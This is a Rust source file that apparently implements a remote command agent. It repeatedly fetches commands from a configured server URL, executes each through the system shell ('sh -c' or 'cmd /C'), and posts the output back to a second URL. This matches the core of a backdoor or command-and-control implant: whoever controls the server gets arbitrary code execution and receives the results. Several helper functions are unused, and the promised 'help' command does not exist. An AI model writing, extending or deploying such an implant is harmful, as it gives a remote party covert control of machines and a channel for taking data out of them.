use std::io::{self, Read};
use std::process::Command;
use std::env;
use std::fs;
use std::path::Path;
use crate::config::ServerConfig;
use reqwest;

async fn execute_and_capture(cmd: &str, args: &[&str]) -> io::Result<String> {
    let output = Command::new(cmd)
        .args(args)
        .output()?;

    Ok(format!("Exit Code: {}\nStdout:\n{}\nStderr:\n{}", 
        output.status,
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)))
}

// Add tree-related functions for fun
fn display_tree(path: &Path, prefix: &str, is_last: bool) -> io::Result<()> {
    let display = path.file_name()
        .unwrap_or_else(|| path.as_os_str())
        .to_string_lossy();
    
    println!("{}{}{}", prefix, 
        if is_last { "└── " } else { "├── " }, 
        display);

    if path.is_dir() {
        let entries = fs::read_dir(path)?
            .collect::<Result<Vec<_>, io::Error>>()?;
        
        for (i, entry) in entries.iter().enumerate() {
            let new_prefix = format!("{}{}", 
                prefix,
                if is_last { "    " } else { "│   " }
            );
            display_tree(&entry.path(), &new_prefix, i == entries.len() - 1)?;
        }
    }
    Ok(())
}

async fn execute_command(cmd: &str) -> io::Result<String> {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    match parts[0] {
        "cd" => {
            let path = parts.get(1).map(|s| *s).unwrap_or(".");
            match env::set_current_dir(path) {
                Ok(_) => Ok(format!("Changed directory to: {}", 
                    env::current_dir()?.display())),
                Err(e) => Ok(format!("Error: {}", e))
            }
        },
        cmd => {
            let (program, args) = if cfg!(windows) {
                ("cmd", vec!["/C", cmd])
            } else {
                ("sh", vec!["-c", cmd])
            };

            let output = Command::new(program)
                .args(args)
                .current_dir(env::current_dir()?)
                .output()?;

            Ok(format!("{}{}",
                String::from_utf8_lossy(&output.stdout),
                String::from_utf8_lossy(&output.stderr)))
        }
    }
}

fn stdin_ready() -> io::Result<bool> {
    let mut stdin = io::stdin();
    let mut buf = [0u8; 1];
    Ok(stdin.read(&mut buf)? > 0)
}

pub async fn start_command_shell(config: ServerConfig) -> Result<(), Box<dyn std::error::Error>> {
    println!("Enhanced Command Shell started. Type 'help' for commands.");

    loop {
        match get_next_command(&config).await {
            Ok(Some(cmd)) => {
                println!("Received command: {}", cmd);
                match execute_command(&cmd).await {
                    Ok(output) => {
                        if let Err(e) = submit_result(&config, &cmd, &output).await {
                            eprintln!("Failed to submit result: {}", e);
                        }
                    }
                    Err(e) => eprintln!("Error executing command: {}", e),
                }
            }
            Ok(None) => {
                tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
            }
            Err(e) => {
                eprintln!("Error getting command: {}", e);
                tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
            }
        }
    }
}

async fn get_next_command(config: &ServerConfig) -> Result<Option<String>, reqwest::Error> {
    let client = reqwest::Client::new();
    let resp = client.get(&config.get_command_url())
        .send()
        .await?;

    if resp.status() == reqwest::StatusCode::NO_CONTENT {
        return Ok(None);
    }

    Ok(Some(resp.text().await?))
}

async fn submit_result(config: &ServerConfig, cmd: &str, output: &str) -> Result<(), reqwest::Error> {
    let client = reqwest::Client::new();
    client.post(&config.submit_result_url())
        .header("X-Command", cmd)
        .body(output.to_string())
        .send()
        .await?;
    
    Ok(())
}
